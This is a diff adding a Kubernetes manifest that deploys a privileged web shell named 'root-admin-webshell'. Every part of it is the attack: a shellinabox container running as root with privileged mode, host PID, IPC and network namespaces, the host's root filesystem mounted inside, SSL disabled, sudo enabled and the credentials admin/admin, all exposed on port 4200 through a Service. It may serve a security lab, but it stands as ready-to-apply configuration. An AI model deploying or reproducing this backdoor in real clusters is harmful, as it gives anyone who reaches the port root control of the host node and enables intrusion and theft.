@@ -1,0 +1,54 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: root-admin-webshell-deployment
+spec:
+  selector:
+    matchLabels:
+      app: root-admin-webshell
+  template:
+    metadata:
+      labels:
+        app: root-admin-webshell
+    spec:
+      hostPID: true
+      hostIPC: true
+      hostNetwork: true
+      volumes:
+        - name: host-filesystem
+          hostPath:
+            path: /
+      containers:
+        - name: root-admin-webshell
+          image: sspreitzer/shellinabox
+          securityContext:
+            runAsUser: 0
+            runAsGroup: 0
+            allowPrivilegeEscalation: true
+            privileged: true
+          ports:
+            - containerPort: 4200
+          volumeMounts:
+            - name: host-filesystem
+              mountPath: /host-system
+          env:
+            - name: SIAB_SSL
+              value: "false"
+            - name: SIAB_SUDO
+              value: "true"
+            - name: SIAB_USER
+              value: "admin"
+            - name: SIAB_PASSWORD
+              value: "admin"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: root-admin-webshell-service
+spec:
+  ports:
+    - protocol: TCP
+      port: 4200
+      targetPort: 4200
+  selector:
+    app: root-admin-webshell
